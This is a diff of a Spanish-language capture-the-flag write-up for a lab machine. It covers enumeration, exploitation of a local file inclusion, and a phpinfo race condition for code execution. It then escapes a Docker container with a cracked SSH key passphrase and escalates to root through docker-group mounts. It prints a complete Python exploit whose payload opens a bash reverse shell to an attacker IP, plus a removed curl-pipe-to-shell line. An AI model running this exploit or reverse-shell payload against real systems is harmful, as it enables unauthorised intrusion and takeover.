@@ -1,143 +1,187 @@
-----------
-**IP:** 
-**SO:** 
-**Vulns:** 
+## Enumeración
 
-------------------------------------------
-Vamos primero a analizar la red en búsqueda de la maquina con ayuda de [[Arp-Scan]]:
-```bash
+Vamos a comenzar analizando la red en busca de la máquina víctima. Para ello, nos ayudaremos de [[Arp-Scan]]:
+
+```
 arp-scan -I eth0 --localnet --ignoredups
 ```
 
 ![[Pasted image 20250830205829.png]]
-Como podemos ver la IP de la maquina es `192.168.1.70`, con esto vamos a intentar realizar con ping un pequeño tanteo del sistema que tiene la maquina victima:
-```bash
+
+Como podemos ver, la dirección IP de la máquina víctima es `192.168.1.70`. Con esto en mente, vamos a realizar una prueba con `ping` para comprobar si la máquina está activa e intentar identificar su sistema operativo:
+
+```
 ping -c 1 192.168.1.70
 ```
 
 ![[Pasted image 20250830205957.png]]
 
-Podemos ver que el `ttl=64` por lo que el sistema posiblemente es Linux.
-Ahora vamos a realizar el escaneo de puerto con [[Nmap]]:
-```bash
+Como podemos observar, el TTL es de 64, por lo que podemos sospechar que se trata de una máquina Linux.
+
+Ahora, vamos a realizar un escaneo de puertos con [[Nmap]] para identificar los servicios disponibles:
+
+```
 nmap -p- --open -sS --min-rate 5000 -v -n -Pn 192.168.1.70 -oG allports
 ```
 
 ![[Pasted image 20250830210957.png]]
-Podemos observar que tenemos únicamente el puerto `80` abierto por lo que vamos a realizarle un escaneo mas a fondo:
 
-```bash
+Como vemos, únicamente tenemos abierto el puerto `80`. Por lo tanto, vamos a realizar un escaneo más exhaustivo para obtener información sobre el servicio:
+
+```
 nmap -p80 -sCV 192.168.1.70 -oN target
 ```
+
 ![[Pasted image 20250830211128.png]]
 
-Perfecto, tenemos una web corriendo en el puerto 80, vamos a comenzar a ver que es lo que tiene primero con ayuda de whatweb para ver sus tecnologías:
-```bash
+Perfecto, tenemos una aplicación web ejecutándose en el puerto 80. Antes de comenzar a explorarla, vamos a utilizar [[WhatWeb]] para identificar las tecnologías que utiliza:
+
+```
 whatweb http://192.168.1.70
 ```
 
 ![[Pasted image 20250830211307.png]]
-Podemos observar la versión de php y la de apache pero no mucho mas por lo que vamos a visitar la web aver que encontramos:
+
+Como podemos observar, encontramos información sobre las versiónes de PHP y Apache, pero no obtenemos muchos más detalles. Por lo tanto, vamos a visitar la página para comprobar qué contenido encontramos:
+
 ![[Pasted image 20250830211449.png]]
 
-vemos esa web, vamos a enumerar un poco y veamos que encontramos.
+Vemos, la página web, pero no encontramos nada especialmente interesante a simple vista. Vamos a continuar con la enumeración para identificar otros recursos que puedan estar disponibles.
 
-No encontramos nada en esta web por lo que vamos a realizar una enumeración para ver que recursos extras podemos encontrar en la web:
-```bash
+Para ello, utilizaremos Gobuster y buscaremos directorios y archivos PHP:
+
+```
 gobuster dir -u http://192.168.1.70 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php
 ```
 
 ![[Pasted image 20250830215053.png]]
-Vemos que tenemos un archivo `info.php` el cual tiene el siguiente contenido:
+
+Como resultado, encontramos el archivo `info.php`. Vamos a acceder a él para comprobar qué información nos proporciona:
+
 ![[Pasted image 20250830220622.png]]
-algo que podemos buscar aquí es si de alguna forma nosotros podemos incluir archivos en el sistema ya que si lo logramos solo tendríamos que buscar la forma de proceder con un [[Local File Inclusion (LFI)]] y cargar un archivo malicioso.
+
+Algo que podemos investigar a partir de este resultado es si existe alguna forma de incluir archivos en el sistema. Si encontramos un parámetro vulnerable a [[Local File Inclusion (LFI)]], podríamos intentar acceder a archivos locales y comprobar hasta dónde nos permite llegar esa vulnerabilidad.
+
 ![[Pasted image 20250830220744.png]]
 
-Vemos que si podemos subir archivos, por lo que vamos a hacer lo siguiente:
+Como podemos ver, la aplicación permite subir archivos. Por lo tanto, vamos a comprobar cómo procesa las peticiónes de subida y si podemos aprovechar esta funcionalidad.
 
-Primero interceptemos una petición normal por GET a la web de info.php y lo mandamos al repeater:
+Primero, vamos a interceptar una petición GET normal hacia `info.php` y enviarla a Repeater en Burp Suite:
+
 ![[Pasted image 20250830220902.png]]
-Ahora vamos a modificarla poco a poco para poder enviar archivos.
 
-Primero cambiemos el método de GET a POST:
+Ahora, vamos a modificar la petición poco a poco para construir una solicitud que permita enviar un archivo.
+
+Primero, cambiamos el método de `GET` a `POST`:
+
 ![[Pasted image 20250830220958.png]]
-Ahora vamos a construir de la siguiente manera la estructura para el envío de un archivo, para tener una referencia de lo que tenemos que usar podemos buscar `content type boundary` y ya tendremos una referencia de la estructura principal:
+
+Después, vamos a construir la estructura necesaria para enviar el archivo. Para tener una referencia del formato, podemos buscar información sobre `Content-Type` y `boundary` en peticiónes `multipart/form-data`:
+
 ![[Pasted image 20250830221824.png]]
 
-Listo enviemos y revisemos la respuesta:
-![[Pasted image 20250830221833.png]]
-filtramos por test y veremos información y la  ruta donde se almaceno el archivo temporal que se subió.
-Esto es una gran señal de que todo esta funcionando, el punto es encontrar una vulnerabilidad de tipo [[Local File Inclusion (LFI)]] para poder cargar estos archivo por lo que vamos a hacer lo siguiente ya que no tenemos mas alternativas.
+Una vez preparada la petición, la enviamos y revisamos la respuesta del servidor:
 
-Vamos a intentar con ayuda de [[Wfuzz]] hacer fuzz por algún parámetro en el `index.php` que es el archivo principal de la web y veamos si conseguimos algo:
-```bash
+![[Pasted image 20250830221833.png]]
+
+Como vemos, al filtrar la respuesta por `test`, encontramos información sobre el archivo y la ruta temporal donde se ha almacenado.
+
+Esto es una buena señal, ya que hemos conseguido que el servidor procese nuestra petición y nos proporcione la ubicación temporal del archivo. Ahora necesitamos encontrar una forma de incluir ese archivo mediante una vulnerabilidad de tipo [[Local File Inclusion (LFI)]].
+
+Como todavía no hemos encontrado otra vía de entrada, vamos a utilizar [[Wfuzz]] para buscar parámetros que puedan ser vulnerables en `index.php`:
+
+```
 wfuzz -c -t 200 --hl=136 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://192.168.1.70/index.php?FUZZ=/etc/passwd"
 ```
 
 ![[Pasted image 20250830222542.png]]
 
-Vemos que logramos obtener un parámetro filename, veamos si es valido:
+Como podemos observar, encontramos un parámetro llamado `filename`. Ahora vamos a comprobar si realmente permite acceder a archivos locales:
+
 ![[Pasted image 20250830222649.png]]
 
-Podemos ver que efectivamente funciona, entonces vamos a crear un archivo maliciosos cmd.php en el sistema para ver si la web nos interpreta y podemos ejecutar comandos logrando un [[Log Poisoning (LFI - RCE)]] por lo que vamos primero a crear el archivo:
+Como vemos, el parámetro funciona y conseguimos obtener el resultado esperado. Por lo tanto, tenemos indicios de que la aplicación es vulnerable a LFI.
+
+Con esto en mente, vamos a intentar aprovechar la subida temporal de archivos junto con la inclusión local para comprobar si podemos conseguir ejecución remota de comandos. Esta técnica puede aprovechar una condición de carrera, por lo que vamos a investigar si es posible acceder al archivo temporal antes de que PHP lo elimine.
+
+Primero, vamos a preparar un archivo PHP llamado `cmd.php` y comprobar que se sube correctamente:
+
 ![[Pasted image 20250830222922.png]]
-Entonces vamos a ver si se sube correctamente:
+
+Ahora, vamos a realizar la subida y revisar la respuesta:
+
 ![[Pasted image 20250830222948.png]]
 
-perfecto, ya tenemos subido el archivo y la ruta temporal.
+Perfecto, ya tenemos el archivo subido y conocemos la ruta temporal que nos devuelve el servidor.
+
 ![[Pasted image 20250830223303.png]]
 
-no podemos ver nada y esto puede ser debido a que al ser un temporal se crea y al instante lo elimina por lo que a nosotros se nos viene a la mente una [[Condiciones de carrera (Race Condition)]] y en si si es eso lo que tenemos que hacer por lo que vamos a usar un script en python que nos permite romper esta vulnerabilidad y es el que se encuentra en la siguiente web https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html.
+Sin embargo, cuando intentamos acceder al archivo, no obtenemos el resultado esperado. Una posible explicación es que PHP elimine el archivo temporal después de procesar la petición.
 
-```python
-#!/usr/bin/python 
+Esto nos lleva a plantear una posible **condición de carrera (**_**Race Condition**_**)**: si conseguimos incluir el archivo mientras todavía existe, podríamos ejecutar su contenido antes de que sea eliminado.
+
+Para probar esta técnica, vamos a utilizar como referencia el script disponible en HackTricks, que demuestra cómo combinar `phpinfo()`, archivos temporales y LFI:
+
+[HackTricks: LFI2RCE vía PHPInfo](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html)
+
+El script original requiere adaptaciones según la aplicación objetivo, por lo que vamos a revisar los parámetros, la petición de inclusión y el código que queremos ejecutar.
+
+```
+#!/usr/bin/python
 import sys
 import threading
 import socket
 
 def setup(host, port):
-    TAG="Security Test"
-    PAYLOAD="""%s\r
+    TAG = "Security Test"
+    PAYLOAD = """%s\r
 <?php system("bash -c 'bash -i>& /dev/tcp/192.168.1.110/443 0>&1'"); ?>\r""" % TAG
-    REQ1_DATA="""-----------------------------7dbff1ded0714\r
+
+    REQ1_DATA = """-----------------------------7dbff1ded0714\r
 Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
 Content-Type: text/plain\r
 \r
 %s
 -----------------------------7dbff1ded0714--\r""" % PAYLOAD
-    padding="A" * 5000
-    REQ1="""POST /phpinfo.php?a="""+padding+""" HTTP/1.1\r
-Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
+
+    padding = "A" * 5000
+
+    REQ1 = """POST /phpinfo.php?a=""" + padding + """ HTTP/1.1\r
+Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=""" + padding + """\r
 HTTP_ACCEPT: """ + padding + """\r
-HTTP_USER_AGENT: """+padding+"""\r
-HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
-HTTP_PRAGMA: """+padding+"""\r
+HTTP_USER_AGENT: """ + padding + """\r
+HTTP_ACCEPT_LANGUAGE: """ + padding + """\r
+HTTP_PRAGMA: """ + padding + """\r
 Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
 Content-Length: %s\r
 Host: %s\r
 \r
-%s""" %(len(REQ1_DATA),host,REQ1_DATA)
-    #modify this to suit the LFI script   
-    LFIREQ="""GET /index.php?filename=%s HTTP/1.1\r
+%s""" % (len(REQ1_DATA), host, REQ1_DATA)
+
+    # Adaptar esta petición a la ruta vulnerable a LFI.
+    LFIREQ = """GET /index.php?filename=%s HTTP/1.1\r
 User-Agent: Mozilla/4.0\r
 Proxy-Connection: Keep-Alive\r
 Host: %s\r
 \r
 \r
 """
+
     return (REQ1, TAG, LFIREQ)
 
 def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
+    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     s.connect((host, port))
     s2.connect((host, port))
 
     s.send(phpinforeq)
     d = ""
+
     while len(d) < offset:
         d += s.recv(offset)
+
     try:
         i = d.index("[tmp_name] =&gt")
         fn = d[i+17:i+31]
@@ -146,67 +190,77 @@ def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
 
     s2.send(lfireq % (fn, host))
     d = s2.recv(4096)
+
     s.close()
     s2.close()
 
     if d.find(tag) != -1:
         return fn
 
-counter=0
+counter = 0
+
 class ThreadWorker(threading.Thread):
     def __init__(self, e, l, m, *args):
         threading.Thread.__init__(self)
         self.event = e
-        self.lock =  l
+        self.lock = l
         self.maxattempts = m
         self.args = args
 
     def run(self):
         global counter
+
         while not self.event.is_set():
             with self.lock:
                 if counter >= self.maxattempts:
                     return
-                counter+=1
+                counter += 1
 
             try:
                 x = phpInfoLFI(*self.args)
+
                 if self.event.is_set():
-                    break                
+                    break
+
                 if x:
                     print "\nGot it! Shell created in /tmp/g"
                     self.event.set()
-                    
+
             except socket.error:
                 return
-    
 
 def getOffset(host, port, phpinforeq):
-    """Gets offset of tmp_name in the php output"""
+    """Obtiene el offset de tmp_name en la respuesta de phpinfo()."""
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((host,port))
+    s.connect((host, port))
     s.send(phpinforeq)
-    
+
     d = ""
+
     while True:
         i = s.recv(4096)
-        d+=i        
+        d += i
+
         if i == "":
             break
-        # detect the final chunk
+
+        # Detectar el final de la respuesta.
         if i.endswith("0\r\n\r\n"):
             break
+
     s.close()
+
     i = d.find("[tmp_name] =&gt")
+
     if i == -1:
         raise ValueError("No php tmp_name in phpinfo output")
-    
-    print "found %s at %i" % (d[i:i+10],i)
-    # padded up a bit
-    return i+256
+
+    print "found %s at %i" % (d[i:i+10], i)
+
+    # Ajustar ligeramente el offset.
+    return i + 256
 
 def main():
-    
     print "LFI With PHPInfo()"
     print "-=" * 30
 
@@ -220,25 +274,27 @@ def main():
         print "Error with hostname %s: %s" % (sys.argv[1], e)
         sys.exit(1)
 
-    port=80
+    port = 80
+
     try:
         port = int(sys.argv[2])
     except IndexError:
         pass
     except ValueError, e:
-        print "Error with port %d: %s" % (sys.argv[2], e)
+        print "Error with port %s: %s" % (sys.argv[2], e)
         sys.exit(1)
-    
-    poolsz=10
+
+    poolsz = 10
+
     try:
         poolsz = int(sys.argv[3])
     except IndexError:
         pass
     except ValueError, e:
-        print "Error with poolsz %d: %s" % (sys.argv[3], e)
+        print "Error with poolsz %s: %s" % (sys.argv[3], e)
         sys.exit(1)
 
-    print "Getting initial offset...",  
+    print "Getting initial offset...",
     reqphp, tag, reqlfi = setup(host, port)
     offset = getOffset(host, port, reqphp)
     sys.stdout.flush()
@@ -251,131 +307,185 @@ def main():
     sys.stdout.flush()
 
     tp = []
-    for i in range(0,poolsz):
-        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))
+
+    for i in range(0, poolsz):
+        tp.append(
+            ThreadWorker(
+                e, l, maxattempts,
+                host, port, reqphp, offset, reqlfi, tag
+            )
+        )
 
     for t in tp:
         t.start()
+
     try:
         while not e.wait(1):
             if e.is_set():
                 break
+
             with l:
-                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
+                sys.stdout.write("\r% 4d / % 4d" % (counter, maxattempts))
                 sys.stdout.flush()
+
                 if counter >= maxattempts:
                     break
+
         print
+
         if e.is_set():
-            print "Woot!  \m/"
+            print "Woot!  \\m/"
         else:
             print ":("
+
     except KeyboardInterrupt:
         print "\nTelling threads to shutdown..."
         e.set()
-    
-    print "Shuttin' down..."
+
+    print "Shutting down..."
+
     for t in tp:
         t.join()
 
-if __name__=="__main__":
+if __name__ == "__main__":
     main()
 ```
 
-en el script modificamos cositas como el comando a ejecutar, la url y el match del file_name al cual debe aplicarse, ya con eso seguros de que se modifico correctamente vamos a intentar ver si con esto logramos obtener una reverse shell:
+En este script debemos adaptar los elementos necesarios a nuestro escenario, como la dirección IP, la ruta de la aplicación que proporciona la información de PHP, el parámetro vulnerable a LFI y el comando que queremos ejecutar.
 
-```bash
- python2.7 phpinfolfi.py 192.168.1.70 80
+Una vez revisadas estas modificaciones, vamos a ejecutar el script con Python 2.7, que es la versión de Python para la que está escrito:
+
+```
+python2.7 phpinfolfi.py 192.168.1.70 80
 ```
 
 ![[Pasted image 20250830224950.png]]
 
-Logramos obtener una conexión y ya estamos dentro, por lo que vamos a hacer el tratamiento para hacer reconocimiento dentro de la maquina:
+Como podemos observar, conseguimos recibir una conexión. Ahora vamos a realizar el tratamiento de la sesión y comenzar a enumerar el sistema para identificar dónde estamos ejecutando los comandos:
+
 ![[Pasted image 20250830225220.png]]
-como vemos en la imagen anterior entramos a la maquina pero en realidad no era la maquina es un contenedor de algún tipo del cual vamos a tener que escapar.
 
-Hemos intentado encontrar varias cosas pero no encontramos nada dentro del docker por lo cual nuestra mejor opción es usar una herramienta mas brusca de enumeración que va a ser el `linPEAS`:
-```bash
-curl -L http://192.168.1.110/linpeas.sh | sh
-```
+Como vemos, en la imagen, hemos conseguido entrar, pero hay algo importante: no estamos directamente en la máquina anfitriona, sino dentro de un contenedor. Por lo tanto, nuestro siguiente objetivo será investigar el entorno y buscar una forma de salir de él.
 
-En mi caso la maquina no tenia internet por lo que descargue el recurso en mi maquina y levante un servidor.
+## Escape del contenedor
+
+Después de realizar varias comprobaciones, no encontramos una vía clara para salir del contenedor. Por lo tanto, vamos a utilizar una herramienta de enumeración más completa: [[LinPEAS]].
+
+En un primer intento podemos descargar y ejecutar la herramienta desde nuestra máquina atacante. Sin embargo, como la máquina víctima no tiene acceso a Internet, vamos a descargar el archivo localmente y levantar un servidor para transferirlo.
+
 ![[Pasted image 20250830230248.png]]
-Vemos en una parte de la información que tenemos algunos archivos ocultos en la raíz por lo que vamos a revisarlos:
+
+Al revisar los resultados de LinPEAS, encontramos varios archivos ocultos en el directorio raíz. Vamos a investigarlos para comprobar si contienen información útil:
 
 ![[Pasted image 20250830230414.png]]
-En este caso que hice fue llevarme el archivo comprimido al directorio `/tmp` y cambiarle el nombre para que no este oculto.
-Ahora vamos a descomprimirlo a ver que encontramos:
+
+En este caso, copiamos el archivo comprimido al directorio `/tmp` y cambiamos su nombre para poder identificarlo y trabajar con él más cómodamente.
+
+Ahora, vamos a descomprimirlo y revisar su contenido:
+
 ![[Pasted image 20250830230535.png]]
 
-vemos que tenemos una clave privada y una publica al parecer de root.
+Como podemos observar, encontramos una clave privada y una clave pública que parecen estar relacionadas con el usuario `root`.
+
 ![[Pasted image 20250830230626.png]]
 
-Vemos que esta cifrada pero esto nos lo pasamos a nuestra maquina y la ponemos en un archivo ya que vamos a intentar romperla:
+La clave privada está cifrada, por lo que vamos a copiarla a nuestra máquina para intentar recuperar su contraseña.
+
 ![[Pasted image 20250830230752.png]]
-ahora vamos a utilizar una utilidad de John que es `ssh2john` que nos permite crear obtener el hash que vamos a intentar romper por fuerza bruta:
-```bash
-ssh2john id_rsa
+
+Para ello, utilizaremos `ssh2john`, una herramienta que permite convertir una clave privada SSH cifrada en un formato que John the Ripper pueda procesar:
+
+```
+ssh2john id_rsa > hash
 ```
 
 ![[Pasted image 20250830230940.png]]
 
-Vamos a guardarlo en un archivo hash para ya poder usar john:
-```bash
+Ahora, que tenemos el hash, vamos a utilizar John the Ripper junto con la lista de contraseñas `rockyou.txt`:
+
+```
 john -w:/usr/share/wordlists/rockyou.txt hash
 ```
 
 ![[Pasted image 20250830231700.png]]
 
-Podemos observar que la password es `choclate93` ahora tenemos que saber que el puerto 22 en el docker no esta habilitado pero esto no quiere decir que en la maquina host tampoco lo este por lo que vamos a ver si en la maquina host lo esta, ahora la IP que nos da el docker es `192.168.150.21` por lo que la IP de la maquina Host tiene que ser la `192.168.150.1`:
-```bash
+Como podemos observar, conseguimos recuperar la contraseña de la clave privada:
+
+- `choclate93`
+
+
+Ahora, debemos recordar que el puerto 22 no estaba expuesto desde el contenedor. Sin embargo, esto no significa que el servicio SSH tampoco esté disponible en la máquina anfitriona.
+
+La dirección IP del contenedor es `192.168.150.21`, por lo que vamos a comprobar si la dirección `192.168.150.1` corresponde a un sistema accesible desde su red:
+
+```
 echo '' > /dev/tcp/192.168.150.1/22 && echo $?
 ```
 
 ![[Pasted image 20250830232015.png]]
-vemos que el código de estado es el `0` por lo que si esta abiertos vamos a conectarnos:
 
-```bash
+Como vemos, el código de salida es `0`, lo que indica que la conexión TCP se ha establecido correctamente. Por lo tanto, vamos a intentar conectarnos por SSH utilizando la clave privada que encontramos:
+
+```
 ssh -i root root@192.168.150.1
 ```
 
 ![[Pasted image 20250830232219.png]]
 
-Podemos ver que no es valida la clave privada y por ende nos pide la clave de root pero del usuario root de sistema y esa no la tenemos.
+Sin embargo, la clave privada no nos permite acceder directamente con el usuario `root`. Esto puede deberse a que la clave corresponde a otro usuario o a que el servidor SSH no acepta esa clave para esa cuenta.
 
-Otra cosa es ver si podemos hacernos root en el contenedor con esa password:
+También podemos probar si la contraseña que recuperamos es reutilizada por el usuario `root` dentro del contenedor:
+
 ![[Pasted image 20250830232418.png]]
 
-En efecto en el contenedor lo logramos.
+Como vemos, conseguimos convertirnos en `root` dentro del contenedor. Esto nos permite continuar con la investigación de los archivos y las claves que encontramos.
 
-root también tiene una clave publica y privada(encriptada también) vemos la publica:
+El usuario `root` también tiene un par de claves SSH, aunque la clave privada está cifrada. Vamos a revisar primero la clave pública:
+
 ![[Pasted image 20250830232656.png]]
-Podemos ver que la clave publica hace referencia a un usuario llamado admin.
-Se suelen dar los casos que por confianza se podría decir algunos usuario que tiene pares de claves pueden conectarse sin proporcionar clave, intentemoslo:
-```bash
 
-```
+Como podemos observar, la clave pública contiene una referencia al usuario `admin`. Esto nos hace pensar que podría existir una relación entre esa clave y una cuenta del sistema anfitrión.
+
+En algunos entornos, las claves SSH se configuran para permitir la autenticación sin contraseña de usuario, aunque la clave privada puede estar protegida por una frase de contraseña. Por lo tanto, vamos a probar si podemos utilizar esa clave para acceder a la máquina anfitriona.
+
 ![[Pasted image 20250830232918.png]]
-vemos que en este caso si nos pide contraseña para la clave privada y podríamos intentar ver si se están reutilizando credenciales usando la de `choclate93`:
+
+Como vemos, se nos solicita la contraseña de la clave privada. Podemos probar la contraseña que recuperamos anteriormente, `choclate93`, para comprobar si se está reutilizando:
+
 ![[Pasted image 20250830233030.png]]
 
-entonces ya salimos del contenedor y estamos en la maquina real, ahora vamos a intentar saltar al usuario root.
+Perfecto, conseguimos salir del contenedor y acceder a la máquina anfitriona. Ahora nuestro objetivo será escalar privilegios hasta obtener acceso como `root` en el sistema real.
 
-Este caso revisemos si no estamos en el grupo docker:
+## Escalada de privilegios
+
+Una vez dentro de la máquina anfitriona, vamos a comprobar los grupos a los que pertenece nuestro usuario para identificar posibles vías de escalada:
+
 ![[Pasted image 20250830233141.png]]
 
-vemos que si estamos entonces ya tenemos una via potencial donde abusando de monturas pueda montar toda la raíz del sistema real en un contenedor para poder tener acceso.
-Por lo tanto vamos a hacer lo siguiente:
+Como podemos observar, pertenecemos al grupo `docker`. Esto es especialmente interesante, ya que los usuarios que pueden controlar el servicio Docker suelen tener permisos suficientes para crear contenedores y configurar sus montajes.
+
+Por lo tanto, podemos aprovechar esta configuración para montar el sistema de archivos raíz de la máquina anfitriona dentro de un contenedor que controlemos.
+
+Vamos a crear un contenedor con un montaje que nos permita acceder al sistema de archivos de la máquina real:
+
 ![[Pasted image 20250830233403.png]]
-ya con el contenedor creado vamos a ingresar en el:
+
+Una vez creado, vamos a entrar en el contenedor:
+
 ![[Pasted image 20250830233506.png]]
 
-ya dentro del mismo recordemos que lo montamos en `/mnt/root` vamos a ver si tenemos todo el contenido:
+Recordemos que montamos el sistema de archivos de la máquina anfitriona en `/mnt/root`. Vamos a revisar su contenido para comprobar si tenemos acceso a los directorios del sistema real:
+
 ![[Pasted image 20250830233543.png]]
 
-Efectivamente tenemos todo el sistema aquí por lo tanto los cambios que se hagan aquí los veremos también fuera por lo tanto vamos a asignar privilegios SUID a la bash y salgamos para ver si podemos ya ingresar:
+Como podemos ver, tenemos acceso al sistema de archivos de la máquina anfitriona. Esto significa que, si tenemos permisos de escritura sobre los archivos montados, los cambios realizados desde el contenedor también se reflejarán fuera de él.
+
+Con esto en mente, vamos a modificar los permisos de la shell de Bash para asignarle el bit SUID. Después saldremos del contenedor y comprobaremos si podemos aprovechar ese cambio para obtener privilegios de `root` en la máquina anfitriona:
+
 ![[Pasted image 20250830233855.png]]
-vemos que los cambios se aplicaron y por lo tanto ya podemos hacernos root:
+
+Como vemos, los cambios se han aplicado. Por lo tanto, vamos a comprobar si podemos utilizar Bash para obtener una shell con privilegios elevados:
+
 ![[Pasted image 20250830233931.png]]
 
-Maquina Terminada :)
+**¡Máquina terminada!**
